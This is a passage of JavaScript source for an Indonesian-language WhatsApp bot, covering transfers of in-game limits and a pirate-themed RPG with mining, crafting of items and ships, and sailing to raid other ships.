				vreden.sendTextWithMentions(m.chat, `Sukses transfer limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
			}
			break
			case 'tfgamelimit':
			case 'transfergamelimit':
			case 'tfglimit': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				var anu = usersdb[m.sender].glimit
				if (anu < args[1] || anu == 'undefined') return m.warning(`Game Limit Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}limit, untuk mengecek Game Limit mu!`)
				usersdb[m.sender].glimit -= parseInt(args[1])
				usersdb[users].glimit += parseInt(args[1])
				vreden.sendTextWithMentions(m.chat, `Sukses transfer Game Limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
			}
			break
			case 'joinrpg': {
				if (usersdb[m.sender].rpg) return m.warning(`Kamu Telah Join Sebelumnya`)
				usersdb[m.sender].rpg = true
				let joinedrpg = `*GAME RPG STARTED*\n\nKamu telah login RPG-Game, sekarang kamu dapat menggunakan command RPG\n\n`
				await vreden.sendMessage(m.chat, {
					text: joinedrpg,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "RPG-GAME (Pirate Adventure)",
							body: 'Pirate adventure in search of riches',
							thumbnailUrl: "https://telegra.ph/file/d661d7829411b8bff9f5f.jpg",
							sourceUrl: "-",
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
			}
			break
			case 'mining': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!rpgdb[m.sender].pickaxe) return m.reply('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
				if (rpgdb[m.sender].darahpickaxe < 1) return m.reply('☹️Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
				let besi = [2, 1, 6, 1, 0, 3, 7, 8, 3, 2, 0, 7, 1, 9]
				let batubara = [1, 1, 2, 1, 0, 6, 0, 0, 2, 5, 1, 0, 1, 0]
				let emas = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
				let perak = [2, 1, 3, 5, 0, 0, 0, 0, 0, 2, 1, 0, 8, 2]
				const besinyo = await pickRandom(besi)
				const batubaranyo = await pickRandom(batubara)
				const emasnyo = await pickRandom(emas)
				const peraknyo = await pickRandom(perak)
				let mining = `*MINING ADVENTURE*\n\nItem Yang Didapat :\n- Besi: ${besinyo}\n- Emas: ${emasnyo}\n- Perak: ${peraknyo}\n- Batu Bara: ${batubaranyo}\n\n_🧰 Disimpan Dalam Inventory..._\n_❤️ Darah Berkurang 20_\n_⛏️ Ketahanan Pickaxe ${rpgdb[m.sender].darahpickaxe}%_\n\n`
				await vreden.sendMessage(m.chat, {
					text: mining,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "RPG-GAME (Mining Resource)",
							body: 'Mining natural resources',
							thumbnailUrl: "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg",
							sourceUrl: "-",
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
				rpgdb[m.sender].darahpickaxe -= 20
				rpgdb[m.sender].besi += besinyo
				rpgdb[m.sender].emas += emasnyo
				rpgdb[m.sender].perak += peraknyo
				rpgdb[m.sender].batubara += batubaranyo
			}
			break
			case 'heal': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!rpgdb[m.sender].darahuser < 1) return m.reply('*😑 Kamu Masih Sehat!*')
				rpgdb[m.sender].darahuser += 100
				editp('Mengistirahatkan Tubuh...', 'Memulihkan...', 'Darah Kamu Sudah Terisi...')
			}
			break
			case 'crafting':
			case 'craft': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (args[0] === "kain") {
					if (!args[1]) return m.reply(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
					if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
					let bulu = Number(parseInt(args[1]) * 2)
					if (rpgdb[m.sender].bulu < bulu) return m.reply(`*Bulu Wol Kamu (${rpgdb[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
					rpgdb[m.sender].kain += parseInt(args[1])
					rpgdb[m.sender].bulu -= bulu
					m.sendForward(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${rpgdb[m.sender].bulu} Bulu Lagi`)
				} else if (args[0] === "kapal") {
					if (rpgdb[m.sender].kapal) return m.reply('Kamu Sudah Memiliki Kapal!')
					let besi = Number(20)
					let kayu = Number(50)
					let kain = Number(2)
					if (rpgdb[m.sender].besi < besi) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kain < kain) return m.reply(`*Kain Kamu (${rpgdb[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
					rpgdb[m.sender].kapal = true
					rpgdb[m.sender].besi -= besi
					rpgdb[m.sender].kayu -= kayu
					rpgdb[m.sender].kain -= kain
					let kapal = `*Berhasil Membuat Kapal!*\n\nSisa Sumberdaya:\n- Besi: ${rpgdb[m.sender].besi}\n- Kain: ${rpgdb[m.sender].kain}\n- Kayu: ${rpgdb[m.sender].kayu}\n\n`
					await vreden.sendMessage(m.chat, {
						text: kapal,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (Pirate Ship)",
								body: 'Build a pirate ship',
								thumbnailUrl: "https://telegra.ph/file/6868733df8aa286682274.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "kapak") {
					if (rpgdb[m.sender].kapak) return m.reply('Kamu Sudah Memiliki Kapak!')
					let besi = Number(2)
					let kayu = Number(1)
					if (rpgdb[m.sender].besi < besi) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					rpgdb[m.sender].kapak = true
					rpgdb[m.sender].besi -= besi
					rpgdb[m.sender].kayu -= kayu
					let kapak = `*Berhasil Membuat Kapak!*\n\nSisa Sumberdaya:\n- Besi: ${rpgdb[m.sender].besi}\n- Kayu: ${rpgdb[m.sender].kayu}\n\n`
					await vreden.sendMessage(m.chat, {
						text: kapak,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/454b6bac735cd5c9e860e.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "rumah") {
					if (!(`${rpgdb[m.sender].wilayahrumah}` === `${rpgdb[m.sender].wilayah}`)) return m.reply(`Kamu Saat Ini Sedang Di ${rpgdb[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
					if (!args[1]) return m.reply('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
					if (isNaN(args[1])) return m.reply('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
					let besi = Number(parseInt(args[1]) * 6)
					let kayu = Number(parseInt(args[1]) * 20)
					if (rpgdb[m.sender].besi < besi) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					rpgdb[m.sender].rumah += parseInt(args[1])
					rpgdb[m.sender].besi -= besi
					rpgdb[m.sender].kayu -= kayu
					let rumah = `*Berhasil Membuat ${args[1]} Rumah!*\n\nJumlah: ${args[1]} Rumah\nLetak: Indonesia\n\n`
					await vreden.sendMessage(m.chat, {
						text: rumah,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (House Crafting)",
								body: 'Build a house to rest',
								thumbnailUrl: "https://telegra.ph/file/748043e987c3b38708d44.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "pickaxe") {
					if (rpgdb[m.sender].pickaxe) return m.reply('Kamu Sudah Memiliki Pickaxe!')
					let besi = Number(2)
					let kayu = Number(1)
					if (rpgdb[m.sender].besi < besi) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					rpgdb[m.sender].pickaxe = true
					rpgdb[m.sender].besi -= besi
					rpgdb[m.sender].kayu -= kayu
					let pickaxe = `*Berhasil Membuat Pickaxe!*\n\nSisa Sumberdaya:\n- Besi: ${rpgdb[m.sender].besi}\n- Kayu: ${rpgdb[m.sender].kayu}\n\n`
					await vreden.sendMessage(m.chat, {
						text: pickaxe,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "bajuzirah") {
					if (rpgdb[m.sender].bzirah) return m.reply('Kamu Sudah Memiliki Baju Zirah!')
					let besi = Number(6)
					let kayu = Number(2)
					let kain = Number(10)
					if (rpgdb[m.sender].besi < besi) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kain < kain) return m.reply(`*Kain Kamu (${rpgdb[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
					rpgdb[m.sender].bzirah = true
					rpgdb[m.sender].besi -= besi
					rpgdb[m.sender].kayu -= kayu
					rpgdb[m.sender].kain -= kain
					let bajuzirah = `*Berhasil Membuat Baju Zirah!*\n\nSisa Sumberdaya:\n- Besi: ${rpgdb[m.sender].besi}\n- Kayu: ${rpgdb[m.sender].kayu}\n- Kain: ${rpgdb[m.sender].kain}\n\n`
					await vreden.sendMessage(m.chat, {
						text: bajuzirah,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "pedang") {
					if (rpgdb[m.sender].pedang) return m.reply('Kamu Sudah Memiliki Pedang!')
					let besi = Number(3)
					let kayu = Number(1)
					if (rpgdb[m.sender].besi < besi) return m.reply(`*Besi Kamu (${rpgdb[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (rpgdb[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${rpgdb[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					rpgdb[m.sender].pedang = true
					rpgdb[m.sender].besi -= besi
					rpgdb[m.sender].kayu -= kayu
					let pedang = `*Berhasil Membuat Pedang!*\n\nSisa Sumberdaya:\n- Besi: ${rpgdb[m.sender].besi}\n- Kayu: ${rpgdb[m.sender].kayu}\n\n`
					await vreden.sendMessage(m.chat, {
						text: pedang,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else {
					let craft = `*Apa Yang Ingin Kamu Buat?*

- kapal
- rumah
- kapak
- pickaxe
- pedang
- bajuzirah
- kain

*Contoh:*
.craft kapak

`
					await vreden.sendMessage(m.chat, {
						text: craft,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG-GAME (Crafting Item)",
								body: 'Make items for survival and adventure',
								thumbnailUrl: "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			break
			case 'berlayar': {
				if (!usersdb[m.sender].rpg) return m.warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!rpgdb[m.sender].kapal) return m.reply('Kamu Tidak Mempunyai Kapal, Silahkan Crafting Kapal Terlebih Dahulu!')
				if (rpgdb[m.sender].darahkapal < 1) return m.reply('Kapal Kamu Rusak, Perbaiki Terlebih Dahulu Kapal Mu\n\nKetik .rawat')
				if (pirates[m.sender]) return m.reply("Kamu sedang berlayar!!")
				if (rpgdb[m.sender].wilayah === args[0]) return m.reply(`Kamu Sedang Di ${args[0]} Saat Ini, Silahkan Pilih Destinasi Lain`)
				if (args[0] === "indonesia") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "india") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "brazil") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "rusia") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "australia") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "kanada") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "greenland") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					rpgdb[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await vreden.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								rpgdb[m.sender].darahkapal = 0
								m.reply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else {
					let berlayar = `*Pilih Destinasi Berlayar!*

🔵 indonesia
🔴 kanada
⚪ rusia
⚫ india
🟣 brazil
🟠 australia
🟢 greenland

Contoh:
${prefix + command} rusia`
					await vreden.sendMessage(m.chat, {
						text: berlayar,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "PIRATE ADVENTURE",
								body: 'Sail across the ocean and go on adventures',
								thumbnailUrl: "https://telegra.ph/file/4275a0a1fcf450835b0ef.jpg",
